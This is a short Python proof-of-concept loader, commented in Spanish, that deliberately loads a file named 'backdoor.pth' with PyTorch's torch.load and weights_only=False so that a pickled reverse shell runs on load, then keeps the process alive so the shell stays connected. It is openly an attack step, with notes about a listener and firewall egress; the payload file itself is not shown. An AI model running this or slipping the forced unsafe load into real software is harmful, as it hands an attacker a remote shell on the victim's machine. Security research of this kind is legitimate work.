#!/usr/bin/env python3
# loader.py - Carga el archivo .pth y ejecuta el backdoor (PoC)
# ADVERTENCIA: Este script es solo para entornos de prueba controlados.

import torch
import sys

def main():
    print("[*] Cargando archivo .pth... (la shell inversa se activará aquí)")
    try:
        # El flag 'weights_only=False' es el vector de ejecución.
        # En PyTorch 2.6+ el valor por defecto cambió a True, por lo que
        # forzamos explícitamente el modo inseguro.
        data = torch.load("backdoor.pth", weights_only=False, map_location='cpu')
        print("[+] Carga completada. Si ves este mensaje y la shell no conecta,")
        print("    verifica que el listener esté activo y el firewall permita la salida.")
        # data contiene el objeto, pero el efecto lateral ya ocurrió.
        # Mantenemos el script en ejecución para que la shell no muera.
        while True:
            import time
            time.sleep(60)
    except Exception as e:
        print(f"[-] Error durante la carga: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
